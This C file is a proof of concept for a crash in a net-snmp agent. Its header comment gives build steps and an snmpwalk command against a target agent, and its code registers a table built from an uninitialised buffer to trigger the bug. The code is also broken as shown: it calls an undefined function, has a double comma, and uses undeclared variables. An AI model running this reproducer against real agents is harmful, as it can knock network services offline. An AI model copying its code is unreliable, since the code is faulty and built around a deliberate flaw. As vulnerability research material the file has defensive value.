/** @example poc.c

 *  this is just an example to show the vulnerability
 *  Makefile contains the following code
 *  CC=gcc

 *  OBJS = VulnAgent.o
 *  TARGETS = VulnAgent
 *  FILENAME = VulnAgent.c
 *  CFLAGS = -I. `net-snmp-config --cflags`
 *  BUILDLIBS = `net-snmp-config --libs`
 *  BUILDAGENTLIBS = `net-snmp-config --agent-libs`
 * 
 *  all: $(TARGETS)

 *  BUG: $(OBJS)
 *    $(CC) $(CFLAGS) -o $(TARGETS) $(FILENAME) $(BUILDLIBS) $(BUILDAGENTLIBS)
 *  clean:
 *    rm $(OBJS) $(TARGETS)

 *  Build (using make):
 *  make BUG

 *  Run agent:
 *  ./VulnAgent

 *  Send request from Manager:
 *  snmpwalk -v 2c -c AliReza [AgentIp] 1.3.6.1.4.1.41414242.2.2.1
 *  BOOOOOOOOOOOOOOOOOOM
 */


#include <net-snmp/net-snmp-config.h>
#include <net-snmp/net-snmp-includes.h>
#include <net-snmp/agent/net-snmp-agent-includes.h>
#include <net-snmp/net-snmp-features.h>
#include <net-snmp/config_api.h>

// ProtoTYpe
void CreateBuggyTable();

void main() {
    /* load default snmpd.conf */
    init_agent("snmpd");
    /* bug here :) */
    CreateTable();
    /*  Initialize MIBs. */
    init_mib_modules();
    /* load default snmpd.conf */
    init_snmp("snmpd");
    /* show packet detail */
    netsnmp_ds_set_boolean(NETSNMP_DS_LIBRARY_ID, NETSNMP_DS_LIB_DUMP_PACKET, 1);
    /* ...make us an Master Agent  */
    netsnmp_ds_set_boolean(NETSNMP_DS_APPLICATION_ID, NETSNMP_DS_AGENT_ROLE, 0);
    /* set snmp version to 2c */
    netsnmp_ds_set_int(NETSNMP_DS_LIBRARY_ID, NETSNMP_DS_LIB_SNMPVERSION, NETSNMP_DS_SNMP_VERSION_2c);
    /* set default port 161 */
    netsnmp_ds_set_int(NETSNMP_DS_LIBRARY_ID, NETSNMP_DS_LIB_DEFAULT_PORT, 161);
    /* set community string */
    vacm_parse_rocommunity("rocommunity", "AliReza");
    /*  Listen on default port (161).  */
    init_master_agent();
    while (1)
    {
        agent_check_and_process(1); /* 0 == don't block */
    }
    /*  At shutdown time:  */
    snmp_shutdown("snmpd");
    SOCK_CLEANUP;
}

void CreateBuggyTable() {
    int r = 0;

    // the OID we want to register our integer at.
    oid my_registration_oid[] = {1, 3, 6, 1, 4, 1, 41414242, 2, 2, 1};

    // create the table struct itself
    g_TableSet = netsnmp_create_table_data_set("nimaarekTable");

    // comment out or remove this line if no support for creation of rows
    g_TableSet->allow_creation = 1;

    // add the index
    netsnmp_table_set_add_indexes(g_TableSet, ASN_INTEGER, 0);

    // create the columns
    char ali[1024];
    netsnmp_table_set_add_default_row(g_TableSet, 1, ASN_OCTET_STR, 1, ali, 0);

    // register the table with the agent
    netsnmp_register_table_data_set(
        netsnmp_create_handler_registration(
            "nimaarekTable", NULL, my_registration_oid,
            OID_LENGTH(my_registration_oid),, HANDLER_CAN_RWRITE),
        g_TableSet, NULL);

    // create a dummy row
    row = netsnmp_create_table_data_row();

    netsnmp_table_row_add_index(1, ASN_INTEGER, r, sizeof(r));

    // now fill in the columns with incrementing integral data
    netsnmp_set_row_column(row, 2, ASN_INTEGER, r, sizeof(r));
    netsnmp_mark_row_column_writable(row, 2, 1);

    // add the row
    netsnmp_table_dataset_add_row(g_TableSet, row);

    netsnmp_register_auto_data_table(g_TableSet, NULL);
}